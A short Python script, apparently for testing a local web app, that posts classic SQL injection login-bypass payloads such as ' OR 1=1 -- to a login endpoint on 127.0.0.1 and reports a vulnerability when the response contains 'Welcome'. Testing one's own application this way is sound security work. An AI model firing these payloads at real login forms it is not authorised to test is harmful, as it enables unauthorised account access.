import requests

url = "http://127.0.0.1:5000/login"

payloads = [
    "' OR 1=1 -- ",
    "' OR '1'='1",
    "' OR 1=1#",
    "' OR 'a'='a",
]

for payload in payloads:

    data = {
        "username": payload,
        "password": "anything"
    }

    print(f"\nTesting payload: {payload}")

    response = requests.post(url, json=data)

    print("Response:", response.text)

    if "Welcome" in response.text:
        print("⚠ SQL Injection vulnerability detected!")
        break